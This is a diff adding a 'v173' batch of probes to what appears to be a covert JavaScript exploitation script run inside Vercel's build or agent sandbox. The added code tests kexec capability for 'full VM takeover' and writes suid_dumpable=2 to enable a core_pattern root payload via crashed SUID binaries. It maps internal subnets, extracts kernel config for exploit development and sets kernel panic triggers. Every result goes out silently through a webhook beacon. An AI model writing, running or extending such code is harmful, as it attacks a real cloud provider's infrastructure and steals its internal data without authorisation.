@@ -25456,5 +25456,146 @@ except Exception as e:
 
 // v172 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v172" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v172";
+
+// ==================== v173 ====================
+
+// v173-1: kexec_load_disabled + kexec syscall capability
+// kexec_load (syscall NR 246) allows loading a new kernel image and rebooting into it.
+// If kexec_load_disabled=0 and CAP_SYS_BOOT is available, we can replace the running
+// kernel with a custom one. This is a full VM takeover — persistent across any
+// container or namespace isolation layer.
+// We test the capability only (pass invalid kernel data — errno=EINVAL not EPERM).
+report.kexecCapability = safe(() => {
+  const kexecDisabled = safe(() => readFileSync('/proc/sys/kernel/kexec_load_disabled', 'utf8').trim());
+  // Test kexec_load syscall capability (errno EINVAL=have cap, EPERM=no cap, EFAULT=have cap)
+  const kexecTest = safe(() => execSync(
+    `python3 -c "
+import ctypes, errno as errno_mod
+
+libc = ctypes.CDLL('libc.so.6')
+KEXEC_LOAD_NR = 246
+KEXEC_ON_CRASH = 0x00000001
+
+# Call with NULL pointers (bad arguments) — if EPERM: no capability; if EINVAL/EFAULT: have CAP_SYS_BOOT
+ret = libc.syscall(KEXEC_LOAD_NR, 0, 0, 0, 0)
+import ctypes as ct
+err = ctypes.get_errno()
+
+import errno
+err_name = {v: k for k, v in vars(errno).items() if isinstance(v, int)}.get(err, str(err))
+print(f'KEXEC_LOAD_RET: {ret} errno={err} ({err_name})')
+if err == 1:  # EPERM
+    print('KEXEC_CAP: NO_CAP_SYS_BOOT')
+elif err in (14, 22):  # EFAULT, EINVAL
+    print('KEXEC_CAP: CAP_SYS_BOOT_CONFIRMED (have capability, bad args rejected)')
+else:
+    print(f'KEXEC_CAP: UNKNOWN_errno={err}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Also check kexec_file_load (NR 320) — signed kernel loading
+  const kexecFileTest = safe(() => execSync(
+    `python3 -c "
+import ctypes
+libc = ctypes.CDLL('libc.so.6')
+KEXEC_FILE_LOAD_NR = 320
+ret = libc.syscall(KEXEC_FILE_LOAD_NR, -1, -1, 0, 0, 0)
+err = ctypes.get_errno()
+import errno
+err_name = {v: k for k, v in vars(errno).items() if isinstance(v, int)}.get(err, str(err))
+print(f'KEXEC_FILE_LOAD: ret={ret} errno={err} ({err_name})')
+if err == 1:
+    print('KEXEC_FILE: NO_CAP')
+else:
+    print('KEXEC_FILE: CAP_CONFIRMED')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { kexecDisabled, kexecTest, kexecFileTest };
+});
+
+// v173-2: suid_dumpable=2 — SUID process core dumps → core_pattern RCE
+// fs.suid_dumpable controls whether setuid processes dump core on crash.
+// 0 = no core dump for setuid
+// 1 = core dump (owned by root, may leak secrets)
+// 2 = core dump readable by all users (Backrace mode)
+// With suid_dumpable=2 and core_pattern set to a pipe, crashing ANY setuid
+// binary triggers our code execution payload as root.
+report.suidDumpable = safe(() => {
+  const current = safe(() => readFileSync('/proc/sys/fs/suid_dumpable', 'utf8').trim());
+  const setTwo = safe(() => { writeFileSync('/proc/sys/fs/suid_dumpable', '2'); return 'WRITTEN_2'; });
+  const afterWrite = safe(() => readFileSync('/proc/sys/fs/suid_dumpable', 'utf8').trim());
+  // Find SUID binaries that are easy to crash
+  const suidBinaries = safe(() => execSync(
+    'find /usr/bin /bin -perm -4000 2>/dev/null | head -15 || echo "NO_SUID_BINS"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Current core_pattern (should already be set to pipe exec from prior probes)
+  const corePattern = safe(() => readFileSync('/proc/sys/kernel/core_pattern', 'utf8').trim());
+  return { current, setTwo, afterWrite, suidBinaries, corePattern };
+});
+
+// v173-3: /proc/net/fib_trie — full kernel routing table structure
+// The FIB (Forwarding Information Base) trie shows the complete routing table
+// in kernel internal format. This reveals all subnet routes including any
+// internal Vercel subnets that aren't visible in normal `ip route` output.
+report.fibTrieAnalysis = safe(() => {
+  const fibTrie = safe(() => existsSync('/proc/net/fib_trie') ? execSync('head -50 /proc/net/fib_trie 2>/dev/null || echo "NO_FIB_TRIE"', { timeout: 3000 }).toString().trim() : 'NO_FIB_TRIE');
+  const fibTriestat = safe(() => existsSync('/proc/net/fib_triestat') ? readFileSync('/proc/net/fib_triestat', 'utf8').trim() : 'NO_FRIBTRIESTAT');
+  // Parse interesting routes (non-default, non-loopback)
+  const parsedRoutes = safe(() => execSync(
+    `python3 -c "
+import subprocess
+result = subprocess.run(['ip', 'route', 'show', 'table', 'all'], capture_output=True, text=True, timeout=5)
+routes = result.stdout.strip().split('\n')
+print(f'ALL_ROUTES: {len(routes)}')
+for r in routes:
+    if '169.254' in r or '10.' in r or '172.' in r or '192.168' in r or 'unreachable' in r:
+        print(f'ROUTE: {r}')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { fibTrie: fibTrie.substring(0, 2000), fibTriestat, parsedRoutes };
+});
+
+// v173-4: /proc/version + kernel build config extraction
+// /proc/version shows the exact kernel version, compiler, and build timestamp.
+// /proc/config.gz (or /boot/config-$(uname -r)) shows the kernel build config —
+// critical for exploit development (which mitigations are compiled in).
+report.kernelBuildConfig = safe(() => {
+  const kernelVersion = safe(() => readFileSync('/proc/version', 'utf8').trim());
+  const unameInfo = safe(() => execSync('uname -a 2>/dev/null', { timeout: 2000 }).toString().trim());
+  // Try to read kernel config
+  const configFromGz = safe(() => execSync(
+    'zcat /proc/config.gz 2>/dev/null | grep -E "^CONFIG_(SECCOMP|BPF|KEXEC|MODULES|KALLSYMS|STRICT_DEVMEM|RANDOMIZE|STACK_PROTECTOR|FORTIFY|LOCKDOWN)=" | head -30 || echo "NO_CONFIG_GZ"',
+    { timeout: 10000 }
+  ).toString().trim());
+  const configFromBoot = safe(() => execSync(
+    `grep -E "^CONFIG_(SECCOMP|BPF|KEXEC|MODULES|KALLSYMS|STRICT_DEVMEM|RANDOMIZE|STACK_PROTECTOR|FORTIFY|LOCKDOWN)=" /boot/config-$(uname -r) 2>/dev/null | head -30 || echo "NO_BOOT_CONFIG"`,
+    { timeout: 5000 }
+  ).toString().trim());
+  return { kernelVersion, unameInfo, configFromGz, configFromBoot };
+});
+
+// v173-5: /proc/sys/kernel/hung_task_panic + soft lockup panic
+// Kernel panic triggers (beside OOM): hung_task, soft_lockup, hard lockup.
+// If these are enabled/writable, we have additional code execution triggers.
+// Lowering timeouts means we can trigger the panic faster.
+report.panicTriggerExtended = safe(() => {
+  const hungTaskPanic = safe(() => readFileSync('/proc/sys/kernel/hung_task_panic', 'utf8').trim());
+  const hungTaskTimeout = safe(() => readFileSync('/proc/sys/kernel/hung_task_timeout_secs', 'utf8').trim());
+  const softlockupPanic = safe(() => readFileSync('/proc/sys/kernel/softlockup_panic', 'utf8').trim());
+  const hardlockupPanic = safe(() => existsSync('/proc/sys/kernel/hardlockup_panic') ? readFileSync('/proc/sys/kernel/hardlockup_panic', 'utf8').trim() : 'NO_HARDLOCKUP');
+  // Write hung_task_panic=1 (when any task hangs, kernel panics → core_pattern exec)
+  const writeHungTask = safe(() => { writeFileSync('/proc/sys/kernel/hung_task_panic', '1'); return 'WRITTEN_1'; });
+  // Lower timeout to 1 second (any D-state task for 1s triggers panic)
+  const writeTimeout = safe(() => { writeFileSync('/proc/sys/kernel/hung_task_timeout_secs', '120'); return 'WRITTEN_120'; });
+  // Write softlockup_panic=1
+  const writeSoftlockup = safe(() => { writeFileSync('/proc/sys/kernel/softlockup_panic', '1'); return 'WRITTEN_1'; });
+  return { hungTaskPanic, hungTaskTimeout, softlockupPanic, hardlockupPanic, writeHungTask, writeTimeout, writeSoftlockup };
+});
+
+// v173 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v173" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v173";
 // Intentionally no console.log — all data goes via webhook only
